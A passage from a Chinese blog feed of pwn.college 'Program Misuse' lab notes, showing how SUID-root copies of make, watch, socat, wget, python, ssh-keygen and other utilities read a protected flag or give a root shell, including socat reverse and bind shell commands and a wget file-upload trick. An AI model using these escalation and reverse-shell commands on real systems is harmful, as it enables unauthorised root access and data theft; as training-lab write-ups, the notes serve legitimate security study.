<br></code></pre></td></tr></table></figure><p>;代表命令结束，{}会被查找到的文件替代</p><p>26.make</p><p>自动化编译命令，根据makefile中的规则来 编译和构建程序。</p><ul><li><code>-f</code>指定特定的makefile，默认在当前目录下寻找makefile</li><li><code>-j</code>指定构建时使用的cpu核心数</li><li><code>make clean</code> 清除之前编译的可执行文件及配置文件。<code>make distclean</code> 清除所有生成的文件。</li><li><code>make install</code>将编译成功的可执行文件安装到系统目录中。</li><li><code>--eval string</code>在解析任何makefile之前将string作为makefile语句解析</li></ul><p>提权语句：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">make -s --eval=$&#x27;x:\n\t-&#x27;&quot;/bin/sh -p&quot;<br></code></pre></td></tr></table></figure><p>效果等同于编写如下的makefile文件后进行make</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">x:</span><br>-/bin/sh -p<br></code></pre></td></tr></table></figure><p>这里x是目标文件，冒号后是编译x需要的依赖，这里没有需要的依赖，因为我们不编译，只执行提权命令。后面每个换行加缩进后是编译需要执行的命令,命令前加”-“表示如果该条命令报错，继续执行下面的命令。</p><p>更详细的例子：</p><p>helloworld函数的功能是打印”Hello World!”</p><p>a中实现helloworld函数的定义，b中声明后调用helloworld，a和b链接成文件x，最后执行x打印”Hello World!”并提权。</p><p>a.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">helloworld</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello World!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>b.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">helloworld</span><span class="hljs-params">()</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>helloworld();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>makefile</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">x:a.o b.o</span><br>gcc -o x a.o b.o<br>./x<br>-/bin/sh -p<br><span class="hljs-section">b.o:b.c</span><br>gcc -c b.c<br><span class="hljs-section">a.o:a.c</span><br>gcc -c a.c<br></code></pre></td></tr></table></figure><p>最终效果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">op1n@ubuntu:~/Desktop/test$ ls<br>a.c  b.c  makefile<br>op1n@ubuntu:~/Desktop/test$ make<br>gcc -c a.c<br>gcc -c b.c<br>gcc -o x a.o b.o<br>./x<br>Hello World!<br>/bin/sh -p<br><span class="hljs-meta prompt_">$ </span><br></code></pre></td></tr></table></figure><p>27.nice</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nice /bin/sh -p<br></code></pre></td></tr></table></figure><p>该命令与进程调度相关，能够以指定niceness值开始进程，该值越低，进程的优先级越高，能占用更多的资源，当然进程优先级还有其它影响因素，可通过<code>ps -l</code>查看进程niceness值。</p><p>无参数运行时默认niceness&#x3D;10。</p><p>该命令只能新建进程，改变正在运行的进程的niceness值需要<code>renice</code>命令。</p><p>28.timeout</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">timeout 1h /bin/sh -p<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">Usage: timeout [OPTION] DURATION COMMAND [ARG]<br>Start COMMAND, and kill it if still running after DURATION.<br>&#x27;s&#x27; for seconds (the default), &#x27;m&#x27; for minutes, &#x27;h&#x27; for hours or &#x27;d&#x27; for days.<br></code></pre></td></tr></table></figure><p>29.stdbuf</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">Usage: stdbuf OPTION... COMMAND<br>Run COMMAND, with modified buffering operations for its standard streams.<br>  -i, --input=MODE   adjust standard input stream buffering<br>  -o, --output=MODE  adjust standard output stream buffering<br>  -e, --error=MODE   adjust standard error stream buffering<br></code></pre></td></tr></table></figure><p>OPTION后跟模式，’L’表示行缓冲，’0’表示无缓冲，其它表示全缓冲，以数字+单位的形式表示缓冲区大小。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">stdbuf -o0 /bin/sh -p <br></code></pre></td></tr></table></figure><p>30.setarch</p><p>可以改变程序的运行架构环境，并自定义环境flag。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">setarch $(uname -m) /bin/sh -p<br></code></pre></td></tr></table></figure><p>31.watch </p><p>可以周期性执行命令，并将命令的运行结果输出到终端。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">watch -x cat /flag<br></code></pre></td></tr></table></figure><p>或者通过如下命令维持一个可交互的shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">watch -x sh -p -c &#x27;reset; exec sh -p 1&gt;&amp;0 2&gt;&amp;0&#x27;<br></code></pre></td></tr></table></figure><p>个人理解：</p><p>为什么<code>watch -x sh -p</code>运行后不能和shell交互呢？</p><p>首先正常通过打开终端启动的shell进程，其0，1，2设备描述符都会指向当前的tty终端，在其它进程中启动的shell进程，其文件描述符继承自父进程。</p><p>而该命令先创建watch进程，watch进程创建子进程sh -p时并没有正常初始化子进程，做了某些改动使其无法从终端获取输入，并且标准输出和错误输出也不是指向终端设备，watch还能够劫获子进程执行后的输出。两个进程的文件描述符指向如下图。</p><p><img src="/2024/02/05/PwnCollege-Fundamentals-ProgramMisuse/QQ%E6%88%AA%E5%9B%BE20240126012226.png" alt="4"></p><p>我们可以通过exec 执行sh -p，使被watch监控的子进程被替换成新的shell进程(exec用于替换当前进程)，这样就能解除shell进程和终端的隔离，从终端获取输入。但是文件描述符1和2继承自原本的shell进程，依然是损坏的，因为0一直指向终端，所以可以通过1&gt;&amp;0 2&gt;&amp;0使其重新指向终端设备。</p><p><img src="/2024/02/05/PwnCollege-Fundamentals-ProgramMisuse/QQ%E6%88%AA%E5%9B%BE20240126010806.png" alt="5"></p><p>这里的reset经测试在本地虚拟机中可不加，但在web的虚拟机中需要添加，否则无法输入，原因未知。</p><p>32.socat</p><p>类似于nc，但比nc更强大的一个网络连接工具，能够建立两个数据源之间的关系，其中每个数据源可以是一个文件、一个 Unix 套接字、UDP、TCP或标准输入输出等。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">Usage: socat [<span class="hljs-keyword">options</span>] <span class="hljs-symbol">&lt;bi-address&gt;</span> <span class="hljs-symbol">&lt;bi-address&gt;</span><br></code></pre></td></tr></table></figure><p><a href="https://www.itcodingman.com/socat_command/">参考</a></p><ul><li><p>无options时默认建立双向连接</p></li><li><p><code>-u</code>，建立第一个数据源向第二个数据源的单向传输</p></li><li><p><code>-U</code>，建立第二个数据源向第一个数据源的单向传输</p></li></ul><p>由于靶机无法访问互联网，无法反弹shell，这里直接输出flag,STDOUT改成STDIN、STDERR、0、1、2都可以</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">socat -u FILE:/flag STDOUT<br></code></pre></td></tr></table></figure><p>其它例子：</p><ul><li>创建文件，从STDIO输入内容</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">socat -u STDIN FILE:/flag.txt,create</span> <br>123<br></code></pre></td></tr></table></figure><ul><li>输出文件内容到stdout</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">socat -u FILE:/flag.txt stdout</span><br>123<br></code></pre></td></tr></table></figure><ul><li>正向shell</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">1.被入侵目标上使用socat监听<br>socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp-listen:9999,bind=0.0.0.0,reuseaddr,fork<br>2.攻击机连接目标获取shell<br>socat file:`tty`,raw,echo=0 tcp:192.168.0.1:9999<br></code></pre></td></tr></table></figure><ul><li>反弹shell</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">1.攻击机上使用socat监听<br>socat file:`tty`,raw,echo=0 tcp-listen:9999,bind=0.0.0.0,reuseaddr,fork<br>2.被入侵目标反弹shell至攻击机<br>socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.0.10:9999<br></code></pre></td></tr></table></figure><p><strong>Requires some light programming to read the flag.!</strong></p><p>33.whiptail </p><p> 可以创建交互式GUI对话框，常用于shell脚本中。</p><ul><li>–textbox <file> <height> <width>，创建一个文本对话框，显示指定文件中的文本</width></height></file></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">whiptail --textbox /flag 80 60<br></code></pre></td></tr></table></figure><ol start="34"><li>awk</li></ol><p>一个文本分析工具，使用同名的awk脚本语言来解析文本，支持正则表达式</p><p><a href="https://www.wjsljc.com/document/shell/advance/awk/#%E5%AE%9A%E4%B9%89">awk语法参考</a>  <a href="https://www.myfreax.com/linux-awk-regular-expressions/">awk中正则表达式参考</a></p><p>可以将awk脚本放在命令行单引号中或使用<code>-f</code>参数指定awk脚本文件</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">awk [<span class="hljs-keyword">options</span>] <span class="hljs-string">&#x27;script&#x27;</span> <span class="hljs-keyword">file</span>(s)<br>awk [<span class="hljs-keyword">options</span>] -f scriptfile <span class="hljs-keyword">file</span>(s)<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">awk &#x27;&#123;printf &quot;%s&quot;,$1&#125;&#x27; /flag<br></code></pre></td></tr></table></figure><p>或使用正则表达式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">awk &#x27;//&#123;print&#125;&#x27; /flag<br></code></pre></td></tr></table></figure><p>35.sed</p><p>stream editor，流编辑器，可使用脚本来处理、编辑文本，按行依次处理。</p><p><a href="https://qianngchn.github.io/wiki/4.html">参考</a></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sed <span class="hljs-selector-attr">[-hnV]</span><span class="hljs-selector-attr">[-e&lt;script&gt;]</span><span class="hljs-selector-attr">[-f&lt;script文件&gt;]</span><span class="hljs-selector-attr">[文本文件]</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sed -e &#x27;&#x27; /flag<br></code></pre></td></tr></table></figure><p>36.ed</p><p>Linux中功能最简单的文本编辑器，一次仅能编辑一行而非全屏幕方式的操作。</p><ul><li><code>p</code>,打印当前行</li><li><code>,p</code>,显示全文</li><li><code>n</code>,显示最后一行的行号和内容</li><li><code>输入数字</code>,选择要编辑的行</li><li><code>q</code>,退出</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@program-misuse~level36:~/Desktop$ ed /flag<br>57    #文件大小<br>p<br>pwn.college&#123;IogjfBJO3PX8oVnPNfyoGnaMK8-.0FO3EDLwcTM1QzW&#125;<br></code></pre></td></tr></table></figure><p><a href="https://cloud.tencent.com/developer/article/1722082">该文章</a>介绍了可以通过sudo ed，再输入!&#x2F;bin&#x2F;sh来获取root shell</p><p>按理来说sudo本质就是利用了suid，但是这里无法通过有suid权限的ed获取root shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@program-misuse~level36:~/Desktop$ ed<br>!/bin/sh -p<br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">id</span></span><br>uid=1000(hacker) gid=1000(hacker) groups=1000(hacker)<br></code></pre></td></tr></table></figure><p><strong>get the flag by doing tricks with permissions</strong></p><p>37.chown</p><p>改变文件拥有者&#x2F;所在组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chown hacker:hacker /flag<br></code></pre></td></tr></table></figure><p>38.chmod</p><p>修改文件权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod +666 /flag<br>cat /flag<br></code></pre></td></tr></table></figure><p>39.cp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cp /flag /dev/stdout<br></code></pre></td></tr></table></figure><p>向文件中写入内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo string | cp /dev/stdin /flag<br></code></pre></td></tr></table></figure><p>40.mv</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mv /usr/bin/cat /usr/bin/mv<br>/challenge/babysuid_level40<br>/usr/bin/mv /flag<br></code></pre></td></tr></table></figure><p><strong>read the flag because they let you program anything!</strong></p><p>41.perl</p><p>Perl被设计为一种文本处理和报告生成的脚本语言,在许多其他领域也被广泛使用，包括系统管理、网络编程、图形用户界面（GUI）开发等。Perl在Web开发领域中也曾经非常流行，特别是在CGI脚本的编写中。其特点包括强大的正则表达式支持、灵活的数据类型、自由格式的代码书写、模块化和可扩展性。</p><ul><li><code>-e</code>,在命令行中直接执行perl代码，否则需要传入pl脚本文件。</li><li><code>-n</code>,按行处理文本，对文本中的每一行运行一遍perl代码，相当于在代码外添加了while循环。</li><li><code>-p</code>,按行处理文本，依次输出每行并对改行文本运行一遍perl代码。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">perl -ne &#x27;print&#x27; /flag<br></code></pre></td></tr></table></figure><p>42.python</p><p>读文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">python -c <span class="hljs-string">&quot;print(open(&#x27;/flag&#x27;).read())&quot;</span></span><br></code></pre></td></tr></table></figure><p>获取root shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; import os</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; os.setuid(0)</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; os.system(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br></code></pre></td></tr></table></figure><p>43.ruby</p><ul><li><code>-e</code>，直接在命令行执行命令</li></ul><p>设置了suid的ruby解释器不允许从stdin获取输入，不允许-e在命令行直接执行命令，只能执行.rb文件中的代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ruby</span><br>Traceback (most recent call last):<br>ruby: no program input from stdin allowed while running setuid (SecurityError)<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">ruby -e <span class="hljs-string">&#x27;puts File.read(&quot;flag&quot;)&#x27;</span></span><br>Traceback (most recent call last):<br>ruby: no -e allowed while running setuid (SecurityError)<br></code></pre></td></tr></table></figure><p>在hacker用户目录中操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">touch hack.rb<br>echo &#x27;puts File.read(&quot;/flag&quot;)&#x27; &gt; hack.rb <br>ruby hack.rb <br></code></pre></td></tr></table></figure><p>44.bash</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">bash -p</span><br>bash-5.0# cat /flag<br></code></pre></td></tr></table></figure><p><strong>Just straight up wasn’t designed to let you read files!</strong></p><p>45.date</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">date</span> -f /flag<br><span class="hljs-built_in">date</span>: invalid <span class="hljs-built_in">date</span> ??pwn.college&#123;4Bs6hvi92Cut9k0txWnQx5cFCDJ.01N4EDLwcTM1QzW&#125;??<br></code></pre></td></tr></table></figure><p>46.dmesg</p><p>dmesg命令]来自英文词组“display message”的缩写，其功能是用于显示开机过程信息。Linux内核会将开机过程信息存储在环形缓冲区（ring buffer）中，随后再写入到&#x2F;var&#x2F;log&#x2F;dmesg文件里，如果开机时来不及查看这些信息，则可以利用dmesg命令进行调取。</p><ul><li>-F, –file <file>           use the file instead of the kernel log buffer</file></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">dmesg -F /flag</span><br></code></pre></td></tr></table></figure><p>47.wc</p><p>Print newline, word, and byte counts for each FILE, and a total line if more than one FILE is specified.</p><p>添加以下选项可以在报错中输出文件内容</p><ul><li>–files0-from&#x3D;F,read input from the files specified by NUL-terminated names in file F;If F is - then read names from standard input</li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">ead input <span class="hljs-built_in">from</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">files</span> specified ... <span class="hljs-keyword">in</span> <span class="hljs-built_in">file</span> F<br>不要wc在命令行上提供文件名，而是从文件 F 中读取它们。<br><br>NUL-terminated names<br>文件 F 中的文件名必须用 NUL 字符（字节值 <span class="hljs-number">0</span>）分隔，而不是换行符、制表符或空格。这是为了正确处理包含空格的文件名。<br><br>If F is - <span class="hljs-keyword">then</span> <span class="hljs-built_in">read</span> names <span class="hljs-built_in">from</span> standard input<br>文件名可以从可以从管道馈送的标准输入中读取，而不是指定真实的文件 F。在这种情况下，文件名仍应以 NUL 结尾。一个典型的例子是find ... -printf0 | wc ... <span class="hljs-comment">--files0-from=-</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wc --files0-from=/flag  <br></code></pre></td></tr></table></figure><p>48.gcc</p><ul><li><code>-x</code>，声明参数中的文件为某语言的源码文件。由于flag文件不是.c结尾，不添加此参数则文件会被识别为要链接的目标文件</li><li><code>-E</code>,只进行预处理，预处理的结果直接输出的终端</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -x c -E /flag<br></code></pre></td></tr></table></figure><p>49.as</p><p>as 是二进制工具集 GNU Binutils 的一员，是 GNU 推出的一款汇编语言编译器集，用于将汇编代码编译为二进制代码，它支持多种不同类型的处理器。</p><ul><li><code>@FILE</code>,read options from FILE</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">as @/flag</span><br>Assembler messages:<br>Error: can&#x27;t open pwn.college&#123;flag&#125; for reading: No such file or directory<br></code></pre></td></tr></table></figure><p>50.wget</p><p>可以解析url并进行文件的下载和传输</p><ul><li><code>-i</code>,将文件视为url列表(每行一个url)，但是报错输出的内容似乎经过了一定的修改，无法通过该方式获取flag</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget -i /flag<br></code></pre></td></tr></table></figure><p>在本地端口接收wget传输的文件，文件内容会直接显示在终端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lvnp 8080   <br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget --post-file=/flag http://127.0.0.1:8080<br></code></pre></td></tr></table></figure><p>对比报错输出的flag和真正的flag，发现wget报错输出时会把大写字母都改成了小写，这个过程不可逆</p><p>pwn.college{g8o-vyld4yuefxroy7wapbf2gml.0lm5edlwctm1qzw}</p><p>pwn.college{g8O-vyLd4yUEFxrOY7waPBf2GMl.0lM5EDLwcTM1QzW}</p><p><strong>Shows how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part)!</strong></p><p>51.ssh-keygen - 用于生成、管理、转换ssh密钥，支持RSA和DSA两种认证密钥</p><ul><li><code>-D</code>,Download the public keys provided by the PKCS#11 shared library pkcs11.  When used in combination with -s, this option indicates that a CA key resides in a PKCS#11 token (see the CERTIFICATES section for details).用于下载 PKCS#11 共享库提供的公钥，从而和与共享库配套的设备进行通信。</li></ul><p><a href="https://www.cnblogs.com/lianshuiwuyi/p/17763654.html">PKCS#11</a> 是一个密码设备（主要是硬件安全模块<a href="https://zh.wikipedia.org/wiki/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9D%97">HSM</a>和智能卡）与应用程序之间的接口规范，定义了一组API，用于进行加密、解密、数字签名、密钥管理和其他密码学操作。PKCS#11接口规范定义了密码设备与应用程序之间的通信协议，以确保安全性和互操作性。例如：硬件安全模块作为一种提供加密等安全功能的计算机硬件设备，除了硬件本身，还要有配套的内核驱动、系统调用接口和用户态库，计算机才能与之通信，PKCS#11就定义了该过程的标准和规范。</p><p>也就是说，我们可以通过-D选项加载自定义的共享库，只要这个共享库符合PKCS#11规范。在<a href="https://docs.oasis-open.org/pkcs11/pkcs11-base/v2.40/os/pkcs11-base-v2.40-os.html#_Toc416959740">PKCS#11定义的函数</a>中，最先执行的是C_GetFunctionList函数，其作用是获取指向 Cryptoki 库的函数指针列表的指针，然后再执行C_Initialize函数初始化 Cryptoki 库。所以我们只要将自己的代码放在C_GetFunctionList函数中，ssh-keygen命令在加载共享库时就会执行其中的代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">C_GetFunctionList</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-type">int</span> fd=<span class="hljs-number">0</span>;<br>        <span class="hljs-type">char</span> buf[<span class="hljs-number">60</span>];<br>        fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,O_RDWR);<br>        read(fd,buf,<span class="hljs-number">60</span>);<br>        write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">60</span>);<br>&#125;<br><br><span class="hljs-comment">//gcc -shared a.c</span><br><span class="hljs-comment">//ssh-keygen -D ./a.out</span><br></code></pre></td></tr></table></figure><h2 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h2><p>0.–help 简单介绍   man 详细手册</p><p>1.man手册中关键词查找 -&gt; 直接&#x2F;keyword   </p><p>2.strace命令 -&gt; 系统调用调试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">strace [command] 2&gt;&amp;1 | grep keyword         #筛选关键字<br></code></pre></td></tr></table></figure><p>3.查找带有suid&#x2F;sgid权限的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -perm -u=s -type f 2&gt;/dev/null //查找suid文件<br><br>find / -perm -g=s -type f 2&gt;/dev/null //查找sgid文件<br></code></pre></td></tr></table></figure><p><code>-type</code>,按文件类型查找,可以是 <code>f</code>（普通文件）、<code>d</code>（目录）、<code>l</code>（符号链接）等</p><p><code>-perm&lt;权限数值&gt;</code>,查找符合指定的权限数值的文件或目录，这里指定的权限为拥有即可，不必一一对应，例如:-perm 777，-perm -g&#x3D;rx(查找有r和x组权限的文件，包括rwx)</p><p><code>2&gt;/dev/null</code>,将标准错误输出重定向到&#x2F;dev&#x2F;null，即删除标准错误输出，不添加此项会产生很多无权限访问文件夹的提示</p><p>4.<code>man 2</code>+系统调用名称可以查看系统调用手册  </p>]]></content>
    
    
    <categories>
      
      <category>PwnCollege刷题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
      <tag>PwnCollege</tag>
      
      <tag>Linux权限提升</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BooFuzz入门-Vivotek摄像头栈溢出漏洞</title>
    <link href="/2023/10/30/BooFuzz%E5%85%A5%E9%97%A8-Vivotek%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/10/30/BooFuzz%E5%85%A5%E9%97%A8-Vivotek%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</url>
    
